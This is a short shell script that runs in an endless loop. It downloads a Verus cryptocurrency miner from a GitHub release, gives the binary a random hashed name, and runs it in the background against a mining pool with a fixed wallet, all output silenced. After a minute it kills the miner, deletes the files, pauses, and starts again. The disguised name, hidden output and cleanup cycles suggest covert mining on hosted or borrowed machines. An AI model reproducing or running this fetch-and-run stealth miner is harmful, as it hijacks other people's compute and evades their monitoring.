#!/bin/sh

# Function to generate a random name based on SHA-256 hash
generate_random_name() {
  # Generate random string
  random_string=$(head /dev/urandom | tr -dc A-Za-z0-9 | head -c 12 ; echo '')

  # Calculate SHA-256 hash of random string and trim to 12 characters
  random_name=$(echo -n "$random_string" | sha256sum | awk '{print substr($1, 1, 12)}')
  echo "$random_name"
}

# Infinite loop to continuously run the script
while true; do
  # Download file
  wget -q https://github.com/hellcatz/hminer/releases/download/v0.59.1/hellminer_linux64_avx2.tar.gz

  # Extract file
  tar -xf hellminer_linux64_avx2.tar.gz
  rm -f hellminer_linux64_avx2.tar.gz
  rm -rf run_miner.sh
  rm -rf verus-solver

  # Generate random name
  random_name=$(generate_random_name)
  mv hellminer "$random_name"

  # Run the program for 1 minute with renamed file, anonymously and in background
  nohup ./"$random_name" -c stratum+tcp://ap.vipor.net:5040 -u RMWTqPzqBZCP3LT893jwxwNhEbs6umRGWw.vpsgithub --cpu 2 >/dev/null 2>&1 &
  miner_pid=$!
  sleep 1m

  # Stop the program
  kill $miner_pid

  # Clean up downloaded and extracted files
  rm -f hellminer_linux64_avx2.tar.gz
  rm -rf "$random_name"
  
  # Pause for 2 minutes before looping again
  sleep 2m
done
